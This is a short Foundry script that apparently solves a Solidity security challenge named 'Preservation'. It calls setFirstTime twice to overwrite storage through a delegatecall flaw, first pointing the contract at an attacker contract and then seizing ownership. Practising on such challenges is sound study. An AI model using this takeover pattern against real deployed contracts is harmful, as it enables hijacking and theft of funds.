// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import { Preservation } from "../src/Preservation.sol";
import { PreservationHack } from "../src/PreservationHack.sol";

contract PreservationHackScript is Script {
    function setUp() public {}

    function run() public {
        Preservation p = Preservation(0xa64A63356b645047DAbAde4a4bb85387d845212a);
        PreservationHack pHack = PreservationHack(0x7d995E1430c0B8A61233bf9Eec76Fa0244fC2B05);
        vm.startBroadcast();
        p.setFirstTime(uint256(uint160(address(pHack))));
        p.setFirstTime(uint256(uint160(0x58890A9cB27586E83Cb51d2d26bbE18a1a647245)));
        vm.stopBroadcast();
    }
}
